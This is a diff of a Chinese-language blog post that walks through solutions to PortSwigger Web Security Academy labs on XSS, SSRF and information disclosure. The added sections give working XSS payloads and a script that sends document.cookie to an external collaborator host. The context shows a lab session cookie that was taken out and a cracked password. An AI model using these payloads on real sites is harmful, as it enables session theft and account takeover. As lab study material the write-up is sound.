@@ -115,7 +115,7 @@ export default function Post() {
                 `}
             />
             <X.P>那么直接访问{'`/product?productId=2&storeId=<script>alert(0)</script>`'}即可。</X.P>
-            <X.H2>Pr: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded</X.H2>
+            <X.H2>【-】Pr: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded</X.H2>
             <X.HighlightBlock background="red">
                 <X.P>待做！</X.P>
             </X.HighlightBlock>
@@ -185,6 +185,46 @@ export default function Post() {
             />
             <X.P>官方题解的思路更简洁一点，核心想法是给元素带上`tabindex`属性后，就可以触发`onfocus`事件（payload中同样需要在URL结尾加上`#xxx`）：</X.P>
             <X.CodeBlock language="html" code='<xxx onfocus="alert(document.cookie)" id="xxx" tabindex="0">' />
+            <X.H2>【-】Pr: Reflected XSS with some SVG markup allowed</X.H2>
+            <X.HighlightBlock background="red">
+                <X.P>待做！</X.P>
+            </X.HighlightBlock>
+            <X.H2>Pr: Reflected XSS in canonical link tag</X.H2>
+            <X.P>本题没有可以显式输入的地方，注意到访问的URL以及参数会被反射到{'`<link rel="canonical" href="...">`'}中，并且可以用单引号闭合注入其他属性。</X.P>
+            <X.P>根据题目提示，用户会使用快捷键，考虑注入`accesskey`属性和`onclick`事件，payload为`/?%27accesskey=%27x%27onclick=%27alert(0)`。</X.P>
+            <X.H2>Pr: Reflected XSS into a JavaScript string with single quote and backslash escaped</X.H2>
+            <X.P>搜索内容会被直接拼接在JavaScript代码里，但转义了`'`和`\\`，这样就不能通过闭合单引号注入：</X.P>
+            <X.CodeBlock
+                language="html"
+                highlightLines="2"
+                code={`
+                <script>
+                    var searchTerms = '...';
+                    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+                </script>
+                `}
+            />
+            <X.P>可以考虑闭合前一个`script`标签，搜索{'`</script><script>alert(0)</script>`'}即可。</X.P>
+            <X.H2>Pr: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped</X.H2>
+            <X.P>和上一题一样，搜索内容会被直接拼接在JavaScript代码里，本题尖括号被编码为HTML实体，转义了单引号，但是没有转义反斜杠；利用这点，字符串`\\'`转义后为`\\\\'`，绕过了对单引号的转义，从而可以闭合字符串。可以搜索{"`\\';alert(0);//`"}。</X.P>
+            <X.H2>Pr: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped</X.H2>
+            <X.P>评论功能，Website输入`https://a`，观察到生成的`a`标签有一个`onclick`属性包含了填入的网址：</X.P>
+            <X.CodeBlock language="html" code={`<a id="author" href="https://a" onclick="var tracker={track(){}};tracker.track('https://a');">1</a>`} />
+            {/* &#38; -> '&' */}
+            <X.P>本题可以利用HTML实体编码绕过对单引号的过滤，payload为{'`https://a&#38;apos;);alert(0);//`'}（填入Website栏）。</X.P>
+            <X.H2>Pr: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped</X.H2>
+            <X.P>搜索内容被拼接在模板字符串中，payload为{'`${alert(0)}`'}。</X.P>
+            <X.H2>Pr: Exploiting cross-site scripting to steal cookies</X.H2>
+            <X.P>利用XSS带出Cookie，然后替换本地的`session`就可以登录目标用户账户。</X.P>
+            <X.CodeBlock
+                language="html"
+                code={`
+                <script>
+                    fetch("https://etbvlhuhszzf2h1ae4b3wp86mxsogf44.oastify.com/" + document.cookie);
+                </script>
+                `}
+            />
+
             <X.H1>SSRF: Server-side request forgery</X.H1>
             <X.H2>Ap: Basic SSRF against the local server</X.H2>
             <X.P>根据提示，发送请求：</X.P>
@@ -395,7 +435,7 @@ export default function Post() {
             <X.P>保存后，在访问记录里就可以看到：</X.P>
             <X.CodeBlock language="text" code="GET /exploit?c=secret=UzB89kNJHCZLkdW393yCPznnISTFaGyN;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz HTTP/1.1" />
             <X.P>解码`stay-logged-in`，得到密码的MD5值`26323c16d5f4dabff3bb136f2460a943`，反查到明文是`onceuponatime`。</X.P>
-
+            {/* --- */}
             <X.H1>Information disclosure</X.H1>
             <X.H2>Ap: Information disclosure in error messages</X.H2>
             <X.P>要寻找的信息是在报错中泄露的使用的库的版本号，注意后端会把报错信息返回。把请求的参数改为单引号：`/product?productId=%27`，可以看到报错：</X.P>
